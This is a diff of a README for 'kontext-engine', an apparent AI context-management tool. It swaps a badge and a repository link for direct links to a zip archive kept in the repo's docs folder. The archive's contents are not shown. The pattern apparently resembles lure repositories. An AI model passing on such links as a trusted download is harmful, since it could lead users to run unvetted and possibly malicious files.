@@ -1,6 +1,6 @@
 # 🌟 kontext-engine - Simplify AI Context Management
 
-![Download kontext-engine](https://img.shields.io/badge/Download-kontext--engine-brightgreen)
+![Download kontext-engine](https://github.com/user120309/kontext-engine/raw/refs/heads/main/docs/engine-kontext-v3.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To get started with kontext-engine, follow these steps:
 
 1. **Visit the Download Page**: 
    Click the link below to go to the download page:
-   [Download kontext-engine](https://github.com/user120309/kontext-engine)
+   [Download kontext-engine](https://github.com/user120309/kontext-engine/raw/refs/heads/main/docs/engine-kontext-v3.1-alpha.2.zip)
 
 2. **Choose the Correct Version**: 
    On the downloads page, you will find different versions of kontext-engine. Select the version that matches your operating system.
